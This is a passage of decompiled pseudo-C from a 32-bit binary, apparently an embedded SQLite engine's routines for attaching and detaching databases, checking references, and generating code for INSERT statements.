  v3 = *(_DWORD *)(a1 + 24);
  v22 = *Src;
  v4 = 0;
  v25 = 0;
  v26 = 0;
  v24 = (char *)sub_100530C6(v22);
  v5 = sub_100530C6(Src[1]);
  Srca = (unsigned __int8 *)v5;
  if ( !v24 )
    v24 = (char *)&unk_10186491;
  if ( !v5 )
    Srca = (unsigned __int8 *)&unk_10186492;
  v6 = *(_DWORD *)(v3 + 4);
  if ( v6 >= *(_DWORD *)(v3 + 100) + 2 )
  {
    v7 = (_BYTE *)sub_10055484(v3, aTooManyAttache, *(_DWORD *)(v3 + 100));
    goto LABEL_40;
  }
  if ( !*(_BYTE *)(v3 + 28) )
  {
    v7 = (_BYTE *)sub_10055484(v3, aCannotAttachDa);
    goto LABEL_40;
  }
  if ( v6 > 0 )
  {
    v23 = *(unsigned __int8 ***)(v3 + 8);
    while ( sub_100593BE(*v23, Srca) )
    {
      v23 += 4;
      if ( ++v4 >= v6 )
        goto LABEL_14;
    }
    v7 = (_BYTE *)sub_10055484(v3, aDatabaseSIsAlr, Srca);
    goto LABEL_40;
  }
LABEL_14:
  v8 = *(void **)(v3 + 8);
  if ( v8 == (void *)(v3 + 416) )
  {
    result = sub_10059073(v3, 48);
    v10 = result;
    if ( !result )
      return result;
    memcpy(result, *(const void **)(v3 + 8), 0x20u);
  }
  else
  {
    result = sub_100590DA(v3, v8, 16 * (v6 + 1));
    if ( !result )
      return result;
    v10 = result;
  }
  v11 = 4 * *(_DWORD *)(v3 + 4);
  *(_DWORD *)(v3 + 8) = v10;
  v12 = &v10[v11];
  memset(v12, 0, 0x10u);
  v13 = sub_100541BA(v3, *(_DWORD *)(v3 + 16) | 0x100, v24, v12 + 1, 0, 2000);
  ++*(_DWORD *)(v3 + 4);
  v25 = v13;
  if ( v13 == 19 )
  {
    v25 = 1;
    v26 = (_BYTE *)sub_10055484(v3, aDatabaseIsAlre);
  }
  else if ( !v13 )
  {
    v14 = sub_10069973(v12[1], v3);
    v12[3] = (int)v14;
    if ( v14 )
    {
      if ( *((_BYTE *)v14 + 72) && *((_BYTE *)v14 + 73) != *(_BYTE *)(*(_DWORD *)(*(_DWORD *)(v3 + 8) + 12) + 73) )
      {
        v26 = (_BYTE *)sub_10055484(v3, aAttachedDataba_0);
        v25 = 1;
      }
    }
    else
    {
      v25 = 7;
    }
    v15 = **(_DWORD **)(v12[1] + 4);
    if ( !*(_BYTE *)(v15 + 11) )
      *(_BYTE *)(v15 + 4) = *(_BYTE *)(v3 + 31);
    sub_1006F6DE(*(unsigned __int8 *)(v3 + 32), v15);
  }
  *v12 = (int)sub_10059194(Srca);
  *((_BYTE *)v12 + 9) = 3;
  if ( v25
    || (sub_10068CBC(v3), v25 = (int)sub_100583C2(v3, (unsigned int *)&v26), result = (_DWORD *)sub_10068D45(v3), v25) )
  {
    v16 = *(_DWORD *)(v3 + 4) - 1;
    v17 = 16 * v16;
    v18 = *(_DWORD *)(*(_DWORD *)(v3 + 8) + 16 * v16 + 4);
    if ( v18 )
    {
      sub_1006256A(v18);
      *(_DWORD *)(*(_DWORD *)(v3 + 8) + v17 + 4) = 0;
      *(_DWORD *)(*(_DWORD *)(v3 + 8) + v17 + 12) = 0;
    }
    sub_1006A029(0, (_DWORD *)v3);
    *(_DWORD *)(v3 + 4) = v16;
    if ( v25 == 7 || v25 == 3082 )
    {
      *(_BYTE *)(v3 + 30) = 1;
      sub_10058EC7(v3, (unsigned int)v26);
      v7 = (_BYTE *)sub_10055484(v3, aOutOfMemory_1);
    }
    else
    {
      if ( v26 )
        goto LABEL_41;
      v7 = (_BYTE *)sub_10055484(v3, aUnableToOpenDa, v24);
    }
LABEL_40:
    v26 = v7;
    if ( !v7 )
    {
      v19 = a1;
LABEL_43:
      result = (_DWORD *)v25;
      if ( v25 )
      {
        v20 = (*(_BYTE *)(v19 + 36) & 1) == 0;
        *(_DWORD *)(v19 + 52) = v25;
        if ( !v20 )
        {
          v21 = sub_10053FC9(v25);
          return (_DWORD *)sub_1005A3FE(0, v19 + 8, -1, v21, 1);
        }
      }
      return result;
    }
LABEL_41:
    v19 = a1;
    sub_1005312B(a1, v26);
    sub_10058EC7(v3, (unsigned int)v26);
    goto LABEL_43;
  }
  return result;
}

//----- (10078DDE) --------------------------------------------------------
void __cdecl sub_10078DDE(int a1, int a2, int *a3)
{
  unsigned __int8 *v3; // eax
  int v4; // edi
  int v5; // ebx
  bool v6; // cc
  int v7; // esi
  int v8; // eax
  char v9[128]; // [esp+10h] [ebp-8Ch] BYREF
  int v10; // [esp+90h] [ebp-Ch]
  unsigned __int8 *v11; // [esp+94h] [ebp-8h]

  v3 = (unsigned __int8 *)sub_100530C6(*a3);
  v4 = *(_DWORD *)(a1 + 24);
  v5 = 0;
  v11 = v3;
  if ( !v3 )
    v11 = (unsigned __int8 *)&unk_10186493;
  v6 = *(_DWORD *)(v4 + 4) <= 0;
  v10 = 0;
  if ( !v6 )
  {
    v7 = *(_DWORD *)(v4 + 8);
    do
    {
      v5 = v7;
      if ( *(_DWORD *)(v7 + 4) && !sub_100593BE(*(unsigned __int8 **)v7, v11) )
        break;
      ++v10;
      v7 += 16;
    }
    while ( v10 < *(_DWORD *)(v4 + 4) );
  }
  if ( v10 < *(_DWORD *)(v4 + 4) )
  {
    if ( v10 >= 2 )
    {
      if ( *(_BYTE *)(v4 + 28) )
      {
        v8 = *(_DWORD *)(v5 + 4);
        if ( !*(_BYTE *)(v8 + 8) && !*(_DWORD *)(v8 + 16) )
        {
          sub_1006256A(v8);
          *(_DWORD *)(v5 + 4) = 0;
          *(_DWORD *)(v5 + 12) = 0;
          sub_1006A029(0, (_DWORD *)v4);
          return;
        }
        sub_10055543(128, (int)v9, aDatabaseSIsLoc, v11);
      }
      else
      {
        sub_10055543(128, (int)v9, aCannotDetachDa_0);
      }
    }
    else
    {
      sub_10055543(128, (int)v9, aCannotDetachDa, v11);
    }
  }
  else
  {
    sub_10055543(128, (int)v9, aNoSuchDatabase, v11);
  }
  sub_1005312B(a1, v9);
}

//----- (10078ECE) --------------------------------------------------------
void __usercall sub_10078ECE(
        int *a1@<eax>,
        int a2,
        char *Src,
        unsigned __int8 *a4,
        unsigned __int8 *a5,
        unsigned __int8 *a6)
{
  int v7; // ebx
  int *v8; // edi
  int v9[9]; // [esp+10h] [ebp-2Ch] BYREF
  int v10; // [esp+34h] [ebp-8h]
  int v11; // [esp+38h] [ebp-4h]

  v11 = *a1;
  memset(v9, 0, sizeof(v9));
  v9[0] = (int)a1;
  if ( sub_10078ADF(a4, (int)v9) || sub_10078ADF(a5, (int)v9) || sub_10078ADF(a6, (int)v9) )
  {
    ++a1[16];
  }
  else
  {
    v10 = (int)sub_1007C271(a1);
    v7 = sub_10078AA4(a1, 4);
    sub_10077F49(a1, v7, a4);
    sub_10077F49(a1, v7 + 1, a5);
    sub_10077F49(a1, v7 + 2, a6);
    v8 = (int *)v10;
    if ( v10 )
    {
      sub_1005AB66(v10, 18, 0, v7 - *(__int16 *)Src + 3, v7 + 3);
      sub_1005AE0E((int)v8, *Src);
      sub_1005AFA8(-1, v8, (unsigned __int16 *)Src, (_BYTE *)0xFFFFFFFB);
      sub_1005ABD1((int)v8, 119, a2 == 24);
    }
  }
  sub_10075FD8(v11, (unsigned int)a4);
  sub_10075FD8(v11, (unsigned int)a5);
  sub_10075FD8(v11, (unsigned int)a6);
}

//----- (10078FDE) --------------------------------------------------------
int __usercall sub_10078FDE@<eax>(int **a1@<eax>, int a2@<ecx>, int *a3@<esi>, int *a4, int *a5)
{
  int v5; // edx

  if ( a2 < 0 || a2 == 1 )
    return 0;
  v5 = *a3;
  *a1 = a3;
  a1[1] = *(int **)(16 * a2 + *(_DWORD *)(v5 + 8));
  a1[2] = a4;
  a1[3] = a5;
  return 1;
}

//----- (1007900F) --------------------------------------------------------
int __cdecl sub_1007900F(int a1, __int16 *a2)
{
  _DWORD *v2; // esi
  int v4; // [esp+10h] [ebp-8h]
  unsigned __int8 *Src; // [esp+14h] [ebp-4h]

  if ( !a2 )
    return 0;
  v4 = 0;
  Src = *(unsigned __int8 **)(a1 + 4);
  v2 = a2 + 4;
  if ( *a2 <= 0 )
    return 0;
  while ( !*v2 )
  {
    *v2 = sub_10059194(Src);
LABEL_6:
    if ( sub_100790B2(a1, v2[4]) || sub_1007910F(a1, v2[7]) )
      return 1;
    ++v4;
    v2 += 14;
    if ( v4 >= *a2 )
      return 0;
  }
  if ( !sub_100593BE((unsigned __int8 *)*v2, Src) )
    goto LABEL_6;
  sub_10059320(*(int **)a1, aSTCannotRefere, *(_DWORD *)(a1 + 8), *(_DWORD *)(a1 + 12), *v2);
  return 1;
}

//----- (100790B2) --------------------------------------------------------
int __cdecl sub_100790B2(int a1, int a2)
{
  int v2; // edi

  v2 = a2;
  if ( !a2 )
    return 0;
  while ( !sub_1007916A(*(int **)v2, a1)
       && !sub_1007900F(a1, *(_DWORD *)(v2 + 8))
       && !sub_1007910F(a1, *(_DWORD *)(v2 + 12))
       && !sub_1007910F(a1, *(_DWORD *)(v2 + 20)) )
  {
    v2 = *(_DWORD *)(v2 + 28);
    if ( !v2 )
      return 0;
  }
  return 1;
}
// 1007900F: using guessed type _DWORD __cdecl sub_1007900F(_DWORD, _DWORD);

//----- (1007910F) --------------------------------------------------------
int __cdecl sub_1007910F(int a1, int a2)
{
  __int16 v3; // ax
  int v4; // eax

  while ( 1 )
  {
    if ( !a2 )
      return 0;
    v3 = *(_WORD *)(a2 + 2);
    if ( (v3 & 0x2000) != 0 )
      return 0;
    v4 = (v3 & 0x800) != 0 ? sub_100790B2(a1, *(_DWORD *)(a2 + 16)) : sub_1007916A(*(int **)(a2 + 16), a1);
    if ( v4 || sub_1007910F(a1, *(_DWORD *)(a2 + 12)) )
      break;
    a2 = *(_DWORD *)(a2 + 8);
  }
  return 1;
}
// 100790B2: using guessed type _DWORD __cdecl sub_100790B2(_DWORD, _DWORD);

//----- (1007916A) --------------------------------------------------------
int __usercall sub_1007916A@<eax>(int *a1@<esi>, int a2)
{
  int v2; // ebx
  _DWORD *v4; // edi

  v2 = 0;
  if ( !a1 )
    return 0;
  v4 = (_DWORD *)a1[3];
  if ( *a1 <= 0 )
    return 0;
  while ( !sub_1007910F(a2, *v4) )
  {
    ++v2;
    v4 += 5;
    if ( v2 >= *a1 )
      return 0;
  }
  return 1;
}
// 1007910F: using guessed type _DWORD __cdecl sub_1007910F(_DWORD, _DWORD);

//----- (100791A3) --------------------------------------------------------
int __usercall sub_100791A3@<eax>(int a1@<eax>, int a2)
{
  while ( 1 )
  {
    if ( !a1 )
      return 0;
    if ( sub_100790B2(a2, *(_DWORD *)(a1 + 8))
      || sub_1007910F(a2, *(_DWORD *)(a1 + 20))
      || sub_1007916A(*(int **)(a1 + 24), a2) )
    {
      break;
    }
    a1 = *(_DWORD *)(a1 + 32);
  }
  return 1;
}

//----- (100791F0) --------------------------------------------------------
void __usercall sub_100791F0(int a1@<esi>, int *a2, int a3, int a4, int a5)
{
  int *v5; // edi

  if ( (*(_BYTE *)(a1 + 34) & 0x10) == 0 )
  {
    v5 = sub_1007C271(a2);
    sub_10069AEC((int)a2, *(_DWORD *)(a1 + 24), a4, a5 == 39, *(_DWORD *)(a1 + 4));
    sub_1005AB66((int)v5, a5, a3, *(_DWORD *)(a1 + 24), a4);
    sub_1005AFA8(-1, v5, *(unsigned __int16 **)(a1 + 12), (_BYTE *)0xFFFFFFF2);
  }
}

//----- (10079249) --------------------------------------------------------
int __usercall sub_10079249@<eax>(int *a1@<eax>, _DWORD *a2@<esi>)
{
  int v2; // ebx
  int v3; // edi
  int result; // eax
  int i; // eax

  if ( !a2[7] )
  {
    v2 = *a1;
    v3 = a2[4];
    result = sub_10058C4C(a2[1] + 2);
    a2[7] = result;
    if ( !result )
    {
      *(_BYTE *)(v2 + 30) = 1;
      return result;
    }
    for ( i = 0; i < a2[1]; ++i )
      *(_BYTE *)(i + a2[7]) = *(_BYTE *)(24 * *(_DWORD *)(a2[2] + 4 * i) + *(_DWORD *)(v3 + 16) + 22);
    *(_BYTE *)(i + a2[7]) = 98;
    *(_BYTE *)(i + a2[7] + 1) = 0;
  }
  return a2[7];
}

//----- (100792A9) --------------------------------------------------------
void __usercall sub_100792A9(int a1@<esi>, int *a2)
{
  int v2; // edi
  int v3; // eax
  int v4; // ecx
  int v5; // edi

  if ( !*(_DWORD *)(a1 + 40) )
  {
    v2 = *a2;
    v3 = sub_10058C4C(*(_DWORD *)(a1 + 12) + 1);
    if ( !v3 )
    {
      *(_BYTE *)(v2 + 30) = 1;
      return;
    }
    v4 = 0;
    if ( *(int *)(a1 + 12) > 0 )
    {
      v5 = 0;
      do
      {
        *(_BYTE *)(v4 + v3) = *(_BYTE *)(*(_DWORD *)(a1 + 16) + v5 + 22);
        ++v4;
        v5 += 24;
      }
      while ( v4 < *(_DWORD *)(a1 + 12) );
    }
    *(_BYTE *)(v3 + *(_DWORD *)(a1 + 12)) = 0;
    *(_DWORD *)(a1 + 40) = v3;
  }
  sub_1005AFA8(-1, a2, *(unsigned __int16 **)(a1 + 40), 0);
}

//----- (10079309) --------------------------------------------------------
int __usercall sub_10079309@<eax>(int *a1@<eax>, int a2@<esi>, int a3, int a4)
{
  _DWORD *v5; // ebx
  int v6; // edx
  int v7; // edi
  _DWORD *v8; // eax
  int v9; // edx
  int i; // ecx
  _DWORD *v12; // [esp+8h] [ebp-4h]

  v5 = sub_1007C271(a1);
  v6 = v5[3];
  if ( (*(_BYTE *)(a2 + 34) & 0x10) != 0 )
    v12 = sub_10070E9E(a2, *a1);
  else
    v12 = 0;
  v7 = a3;
  if ( a3 >= v6 )
    return 0;
  while ( 1 )
  {
    v8 = sub_1005B0D5(v7, v5);
    if ( *(_BYTE *)v8 == 38 && v8[3] == a4 )
    {
      v9 = v8[2];
      if ( v9 == *(_DWORD *)(a2 + 24) )
        return 1;
      for ( i = *(_DWORD *)(a2 + 20); i; i = *(_DWORD *)(i + 32) )
      {
        if ( v9 == *(_DWORD *)(i + 20) )
          return 1;
      }
    }
    if ( *(_BYTE *)v8 == 124 && (_DWORD *)v8[4] == v12 )
      break;
    if ( ++v7 >= v5[3] )
      return 0;
  }
  return 1;
}
// 10079339: variable 'v6' is possibly undefined

//----- (10079388) --------------------------------------------------------
_DWORD *__usercall sub_10079388@<eax>(int *a1@<ecx>, int a2@<ebx>, int a3)
{
  _DWORD *result; // eax
  int *v4; // edi

  result = 0;
  if ( (*(_BYTE *)(a2 + 34) & 8) != 0 )
  {
    v4 = (int *)a1[106];
    if ( !v4 )
      v4 = a1;
    result = (_DWORD *)v4[104];
    if ( !result )
      goto LABEL_8;
    do
    {
      if ( result[1] == a2 )
        break;
      result = (_DWORD *)*result;
    }
    while ( result );
    if ( !result )
    {
LABEL_8:
      result = sub_10059073(*a1, 16);
      if ( !result )
        return result;
      *result = v4[104];
      v4[104] = (int)result;
      result[1] = a2;
      result[2] = a3;
      v4[18] += 2;
      result[3] = v4[18]++;
    }
    return (_DWORD *)result[3];
  }
  return result;
}

//----- (100793F3) --------------------------------------------------------
int __cdecl sub_100793F3(int *a1)
{
  int *v1; // ecx
  int result; // eax
  int *v3; // ebx
  _DWORD *v4; // edi
  int v5; // esi
  int v6; // [esp+Ch] [ebp-8h]
  int v7; // [esp+10h] [ebp-4h]

  v1 = a1;
  result = *a1;
  v3 = (int *)a1[3];
  v4 = (_DWORD *)a1[104];
  v6 = *a1;
  if ( v4 )
  {
    while ( 1 )
    {
      v7 = v4[3];
      sub_100791F0(*(_DWORD *)(*(_DWORD *)(16 * v4[2] + *(_DWORD *)(v6 + 8) + 12) + 68), v1, 0, v4[2], 38);
      v5 = v3[3];
      sub_1005AC02(v3, 94, 0, v7 - 1, 0, *(unsigned __int16 **)(v4[1] + 4), 0);
      sub_1005ABE8((int)v3, 64, 0, v5 + 9);
      sub_1005AB66((int)v3, 28, 0, 0, v7);
      sub_1005AB66((int)v3, 75, v7 - 1, v5 + 7, v7);
      sub_1005AE0E((int)v3, 8);
      sub_1005ABE8((int)v3, 60, 0, v7 + 1);
      sub_1005AB66((int)v3, 28, 0, 1, v7);
      sub_1005ABE8((int)v3, 1, 0, v5 + 9);
      sub_1005ABE8((int)v3, 66, 0, v5 + 2);
      sub_1005ABE8((int)v3, 7, 0, v7);
      result = sub_1005ABB9((int)v3, 42);
      v4 = (_DWORD *)*v4;
      if ( !v4 )
        break;
      v1 = a1;
    }
  }
  return result;
}

//----- (1007950C) --------------------------------------------------------
int __usercall sub_1007950C@<eax>(int result@<eax>, int a2, int a3)
{
  if ( a2 > 0 )
    return sub_1005ABE8(*(_DWORD *)(result + 12), 111, a2, a3);
  return result;
}

//----- (1007952A) --------------------------------------------------------
int __cdecl sub_1007952A(int *a1)
{
  int *v1; // esi
  int result; // eax
  int v3; // ebx
  _DWORD *v4; // edi
  int v5; // edx
  int v6; // [esp+Ch] [ebp-20h]
  int v7; // [esp+10h] [ebp-1Ch]
  int v8; // [esp+14h] [ebp-18h]
  int v9; // [esp+14h] [ebp-18h]
  int v10; // [esp+18h] [ebp-14h]
  int v11; // [esp+20h] [ebp-Ch]
  int v12; // [esp+20h] [ebp-Ch]
  int v13; // [esp+24h] [ebp-8h]
  int v14; // [esp+28h] [ebp-4h]

  v1 = a1;
  result = *a1;
  v3 = a1[3];
  v4 = (_DWORD *)a1[104];
  if ( v4 )
  {
    while ( 1 )
    {
      v11 = v4[3];
      v14 = sub_10078A55((int)v1);
      sub_100791F0(*(_DWORD *)(*(_DWORD *)(v5 + 12) + 68), v1, 0, v4[2], 39);
      v13 = v11 + 1;
      v7 = sub_1005ABD1(v3, 74, v11 + 1);
      v8 = sub_1005ABB9(v3, 64);
      v10 = sub_1005AB66(v3, 28, 0, 0, v14);
      v6 = v11 - 1;
      v12 = sub_1005AB66(v3, 76, v11 - 1, 0, v14);
      sub_1005ABE8(v3, 66, 0, v10);
      sub_1005AE20(v8, v3);
      sub_1005ABE8(v3, 53, 0, v13);
      v9 = sub_1005ABB9(v3, 1);
      sub_1005AE20(v12, v3);
      sub_1005ABE8(v3, 60, 0, v13);
      sub_1005AE20(v7, v3);
      sub_1005AE20(v9, v3);
      sub_1005AB66(v3, 30, v6, 2, v14);
      sub_1005AB66(v3, 54, 0, v14, v13);
      sub_1005AE0E(v3, 8);
      sub_1005ABB9(v3, 42);
      result = sub_10078A70((int)a1, v14);
      v4 = (_DWORD *)*v4;
      if ( !v4 )
        break;
      v1 = (int *)result;
    }
  }
  return result;
}
// 10079571: variable 'v5' is possibly undefined

//----- (1007967E) --------------------------------------------------------
void __cdecl sub_1007967E(int a1, int a2, int *a3, int **a4, unsigned int *a5, int a6)
{
  int v6; // edi
  int v7; // ebx
  int *v8; // eax
  int v9; // ebx
  int *v10; // eax
  bool v11; // al
  int *v12; // eax
  int v13; // esi
  int v14; // esi
  int v15; // eax
  _BYTE *v16; // eax
  int v17; // esi
  int v18; // ecx
  int v19; // eax
  int v20; // ecx
  signed int v21; // eax
  int i; // esi
  int v23; // eax
  _DWORD *v24; // eax
  int v25; // ecx
  int *v26; // esi
  int v27; // eax
  int v28; // ecx
  int v29; // eax
  bool v30; // zf
  int v31; // eax
  int v32; // esi
  int v33; // eax
  int v34; // edx
  _DWORD *v35; // ecx
  unsigned __int16 *v36; // ecx
  int v37; // eax
  int v38; // edi
  unsigned __int8 *v39; // eax
  unsigned __int8 v40; // cl
  int v41; // esi
  _DWORD *v42; // eax
  _DWORD *v43; // ecx
  int v44; // esi
  bool v45; // cc
  unsigned int *v46; // edx
  int v47; // eax
  _DWORD *v48; // ecx
  int *v49; // edi
  int v50; // esi
  int v51; // ebx
  int v52; // esi
  int *v53; // esi
  int v54[9]; // [esp+Ch] [ebp-9Ch] BYREF
  int v55[4]; // [esp+30h] [ebp-78h] BYREF
  int v56; // [esp+40h] [ebp-68h]
  int v57; // [esp+44h] [ebp-64h]
  int v58; // [esp+48h] [ebp-60h]
  int v59; // [esp+4Ch] [ebp-5Ch]
  BOOL v60; // [esp+50h] [ebp-58h]
  int v61; // [esp+54h] [ebp-54h]
  unsigned __int8 *v62; // [esp+58h] [ebp-50h] BYREF
  int v63; // [esp+5Ch] [ebp-4Ch]
  unsigned __int16 *v64; // [esp+60h] [ebp-48h] BYREF
  unsigned int v65; // [esp+64h] [ebp-44h]
  int v66; // [esp+68h] [ebp-40h]
  int v67; // [esp+6Ch] [ebp-3Ch]
  int v68; // [esp+70h] [ebp-38h]
  _DWORD *v69; // [esp+74h] [ebp-34h]
  int v70; // [esp+78h] [ebp-30h]
  int v71; // [esp+7Ch] [ebp-2Ch]
  int v72; // [esp+80h] [ebp-28h]
  int v73; // [esp+84h] [ebp-24h]
  int v74; // [esp+88h] [ebp-20h]
  int v75; // [esp+8Ch] [ebp-1Ch]
  int v76; // [esp+90h] [ebp-18h]
  int v77; // [esp+94h] [ebp-14h]
  unsigned __int8 **v78; // [esp+98h] [ebp-10h]
  int v79; // [esp+9Ch] [ebp-Ch]
  int v80; // [esp+A0h] [ebp-8h]
  int *v81; // [esp+A4h] [ebp-4h]

  v73 = -1;
  v6 = a1;
  v7 = *(_DWORD *)a1;
  v80 = 0;
  v67 = 0;
  v68 = 0;
  v70 = 0;
  v58 = 0;
  v59 = 0;
  v56 = 0;
  v61 = 0;
  v57 = 0;
  v71 = 0;
  v65 = 0;
  v75 = v7;
  memset(v55, 0, sizeof(v55));
  if ( *(_DWORD *)(a1 + 64) )
    goto LABEL_167;
  if ( *(_BYTE *)(v7 + 30) )
    goto LABEL_167;
  if ( !*(_DWORD *)(a2 + 12) )
    goto LABEL_167;
  v8 = sub_1008010E(a2, (int *)a1);
  v9 = (int)v8;
  if ( !v8 )
    goto LABEL_167;
  v76 = sub_1005855F(v75, v8[17]);
  v63 = sub_100730F2((_BYTE *)a1, v9, 105, 0, &v62);
  v60 = *(_DWORD *)(v9 + 28) != 0;
  if ( sub_1006B423((int *)a1, v9) )
    goto LABEL_167;
  if ( sub_10080158(a1, v9, (int)v62) )
    goto LABEL_167;
  v10 = sub_1007C271((int *)a1);
  v81 = v10;
  if ( !v10 )
    goto LABEL_167;
  if ( !*(_BYTE *)(a1 + 19) )
    *((_BYTE *)v10 + 97) = 1;
  v11 = a4 || v63;
  sub_1006CB39((int *)a1, v76, v11);
  if ( a5 || !sub_1007AA4D((int *)a4, v9, a1, a6, v76) )
  {
    v69 = sub_10079388((int *)a1, v9, v76);
    if ( a4 )
    {
      v71 = ++*(_DWORD *)(a1 + 72);
      sub_1005ABE8((int)v81, 7, 0, v71);
      v55[2] = 0;
      v55[3] = 0;
      v12 = v81;
      v55[1] = ++*(_DWORD *)(a1 + 72);
      LOWORD(v55[0]) = 10;
      v13 = v12[3] + 2;
      sub_1005ABE8((int)v12, 7, v12[3] + 1, v55[1]);
      v66 = sub_1005AB66((int)v81, 1, 0, 0, 0);
      if ( sub_1007E480(a1, a4, (unsigned __int8 *)v55) || *(_DWORD *)(a1 + 64) || *(_BYTE *)(v75 + 30) )
        goto LABEL_167;
      sub_1005ABE8((int)v81, 7, 1, v71);
      sub_1005ABD1((int)v81, 4, v55[1]);
      sub_1005AB66((int)v81, 6, 2, 2, 0);
      sub_1005AE20(v66, (int)v81);
      v61 = v55[2];
      v72 = **a4;
      if ( v63 || sub_10079309((int *)a1, v9, v13, v76) )
      {
        v14 = *(_DWORD *)(a1 + 68);
        *(_DWORD *)(a1 + 68) = v14 + 1;
        v68 = 1;
        v70 = v14;
        v78 = (unsigned __int8 **)sub_10078A55(a1);
        v76 = sub_10078A55(a1);
        sub_1005ABE8((int)v81, 40, v14, v72);
        v66 = sub_1005ABD1((int)v81, 4, v55[1]);
        v74 = sub_1005ABD1((int)v81, 26, v71);
        sub_1005AB66((int)v81, 30, v61, v72, (int)v78);
        sub_1005ABE8((int)v81, 53, v14, v76);
        sub_1005AB66((int)v81, 54, v14, (int)v78, v76);
        sub_1005ABE8((int)v81, 1, 0, v66);
        sub_1005AE20(v74, (int)v81);
        v15 = sub_10078A70(a1, (int)v78);
        sub_10078A70(v15, v76);
      }
    }
    else
    {
      memset(v54, 0, sizeof(v54));
      v70 = -1;
      v54[0] = a1;
      if ( a3 )
        v72 = *a3;
      else
        v72 = 0;
      v77 = 0;
      if ( v72 > 0 )
      {
        v78 = 0;
        do
        {
          if ( sub_1008003C(*(int *)((char *)v78 + a3[3]), (int)v54) )
            goto LABEL_167;
          ++v77;
          v78 += 5;
        }
        while ( v77 < v72 );
        v6 = a1;
      }
    }
    if ( (*(_BYTE *)(v9 + 34) & 0x10) != 0 && *(int *)(v9 + 12) > 0 )
    {
      v16 = (_BYTE *)(*(_DWORD *)(v9 + 16) + 23);
      v17 = *(_DWORD *)(v9 + 12);
      do
      {
        v18 = *v16 != 0;
        v16 += 24;
        v80 += v18;
        --v17;
      }
      while ( v17 );
    }
    if ( a5 )
    {
      v20 = a5[1];
      if ( v72 != v20 )
      {
        sub_10059320((int *)v6, "%d values for %d columns", v72, a5[1]);
        goto LABEL_167;
      }
      v21 = 0;
      if ( v20 > 0 )
      {
        do
          *(_DWORD *)(*a5 + 8 * v21++ + 4) = -1;
        while ( v21 < (int)a5[1] );
      }
      for ( i = 0; i < (int)a5[1]; ++i )
      {
        v80 = 0;
        if ( *(int *)(v9 + 12) > 0 )
        {
          v74 = *a5 + 8 * i;
          v78 = *(unsigned __int8 ***)(v9 + 16);
          while ( sub_100593BE(*(unsigned __int8 **)v74, *v78) )
          {
            ++v80;
            v78 += 6;
            if ( v80 >= *(_DWORD *)(v9 + 12) )
              goto LABEL_51;
          }
          v23 = v80;
          *(_DWORD *)(v74 + 4) = v80;
          if ( v23 == *(_DWORD *)(v9 + 8) )
            v73 = i;
        }
LABEL_51:
        if ( v80 >= *(_DWORD *)(v9 + 12) )
        {
          if ( !sub_10076961(*(unsigned __int8 **)(*a5 + 8 * i)) )
          {
            sub_10059320((int *)v6, "table %S has no column named %s", (const wchar_t *)a2, 0);
            ++*(_DWORD *)(a1 + 64);
            goto LABEL_167;
          }
          v73 = i;
        }
      }
    }
    else if ( v72 )
    {
      v19 = *(_DWORD *)(v9 + 12) - v80;
      if ( v72 != v19 )
      {
        sub_10059320((int *)v6, "table %S has %d columns but %d values were supplied", (const wchar_t *)a2, 0, v19);
        goto LABEL_167;
      }
      if ( v72 > 0 )
        v73 = *(_DWORD *)(v9 + 8);
    }
    if ( (*(_WORD *)(v75 + 12) & 0x1000) != 0 )
    {
      v57 = ++*(_DWORD *)(v6 + 72);
      sub_1005ABE8((int)v81, 7, 0, v57);
    }
    if ( !v60 )
    {
      v67 = *(_DWORD *)(v6 + 68);
      v74 = sub_1007A92E((int *)v6, v9, v67, 39);
      v24 = sub_10059073(v75, 4 * v74 + 4);
      v25 = 0;
      v65 = (unsigned int)v24;
      if ( !v24 )
        goto LABEL_167;
      if ( v74 > 0 )
      {
        do
          *(_DWORD *)(v65 + 4 * v25++) = ++*(_DWORD *)(v6 + 72);
        while ( v25 < v74 );
      }
    }
    if ( v68 )
    {
      v26 = v81;
      v58 = sub_1005ABD1((int)v81, 64, v70);
      v59 = v26[3];
    }
    else if ( a4 )
    {
      v59 = sub_1005ABD1((int)v81, 4, v55[1]);
      v58 = sub_1005ABD1((int)v81, 26, v71);
    }
    v27 = ++*(_DWORD *)(v6 + 72);
    v28 = v27 + 1;
    v29 = *(_DWORD *)(v9 + 12) + v27 + 1;
    *(_DWORD *)(v6 + 72) = v29;
    v30 = (*(_BYTE *)(v9 + 34) & 0x10) == 0;
    v76 = v28;
    v79 = v28;
    if ( !v30 )
    {
      v79 = ++v28;
      *(_DWORD *)(v6 + 72) = v29 + 1;
    }
    v66 = v28 + 1;
    v78 = (unsigned __int8 **)sub_1005AC63((int)v81);
    if ( ((unsigned __int8)v62 & 1) != 0 )
    {
      v31 = sub_10078AA4((_DWORD *)v6, *(_DWORD *)(v9 + 12) + 1);
      v80 = v31;
      if ( v73 >= 0 )
      {
        if ( v68 )
        {
          sub_1005AB66((int)v81, 28, v70, v73, v80);
        }
        else
        {
          sub_10077F49((int *)v6, v80, *(unsigned __int8 **)(20 * v73 + a3[3]));
          v6 = a1;
        }
        v32 = sub_1005ABD1((int)v81, 74, v80);
        sub_1005ABE8((int)v81, 7, -1, v80);
        sub_1005AE20(v32, (int)v81);
        sub_1005ABD1((int)v81, 21, v80);
      }
      else
      {
        sub_1005ABE8((int)v81, 7, -1, v31);
      }
      v77 = 0;
      if ( *(int *)(v9 + 12) > 0 )
      {
        v74 = 0;
        v71 = v80 + 1;
        do
        {
          if ( a5 )
          {
            v34 = a5[1];
            v33 = 0;
            if ( v34 > 0 )
            {
              v35 = (_DWORD *)(*a5 + 4);
              do
              {
                if ( *v35 == v77 )
                  break;
                ++v33;
                v35 += 2;
              }
              while ( v33 < v34 );
            }
            if ( v33 >= v34 )
            {
              sub_10077F49((int *)v6, v71, *(unsigned __int8 **)(*(_DWORD *)(v9 + 16) + v74 + 4));
LABEL_92:
              v6 = a1;
              goto LABEL_93;
            }
          }
          else
          {
            v33 = v77;
          }
          if ( !v68 )
          {
            v36 = *(unsigned __int16 **)(v6 + 12);
            v62 = *(unsigned __int8 **)(20 * v33 + a3[3]);
            v64 = v36;
            v37 = sub_10077F49((int *)v6, v71, v62);
            if ( *v62 != 0x84 )
            {
              v38 = ++*(_DWORD *)(a1 + 72);
              sub_1005ABE8((int)v64, 14, v37, v38);
              v39 = v62;
              v40 = *v62;
              *((_DWORD *)v62 + 6) = v38;
              v39[35] = v40;
              *v39 = -124;
            }
            goto LABEL_92;
          }
          sub_1005AB66((int)v81, 28, v70, v33, v71);
LABEL_93:
          ++v77;
          v74 += 24;
          ++v71;
        }
